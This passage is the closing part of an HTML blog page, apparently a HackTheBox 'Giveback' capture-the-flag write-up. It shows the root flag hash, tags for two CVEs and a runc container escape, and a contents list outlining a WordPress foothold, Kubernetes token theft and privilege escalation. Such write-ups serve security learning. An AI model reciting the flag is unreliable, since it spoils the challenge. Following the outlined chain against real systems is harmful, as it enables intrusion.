+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">84ed26973cc635eb25918fdd5d477419</span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for GiveBack, hope you learned something new!</p>
+<p>-0xkuje</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Giveback</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-02-23 17:06:50</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-02-23 19:05:36
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/02/23/Hackthebox-Giveback/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/CVE-2024-5932/">#CVE-2024-5932</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CVE-2024-4577/">#CVE-2024-4577</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/WordPress/">#WordPress</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/GiveWP/">#GiveWP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/PHP-Object-Injection/">#PHP Object Injection</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/PHP-CGI/">#PHP-CGI</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Kubernetes/">#Kubernetes</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Container-Escape/">#Container Escape</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/runc/">#runc</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/02/15/Hackthebox-Soulmate/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Soulmate</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Giveback</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-CVE-2024-5932-GiveWP-PHP-Object-Injection"><span class="nav-text">Foothold - CVE-2024-5932 (GiveWP PHP Object Injection)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumerating-the-Kubernetes-Environment"><span class="nav-text">Enumerating the Kubernetes Environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pivoting-to-the-Legacy-Intranet-CMS"><span class="nav-text">Pivoting to the Legacy Intranet CMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2024-4577-PHP-CGI-Argument-Injection"><span class="nav-text">CVE-2024-4577 (PHP-CGI Argument Injection)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stealing-the-Kubernetes-Service-Account-Token"><span class="nav-text">Stealing the Kubernetes Service Account Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Flag"><span class="nav-text">User Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
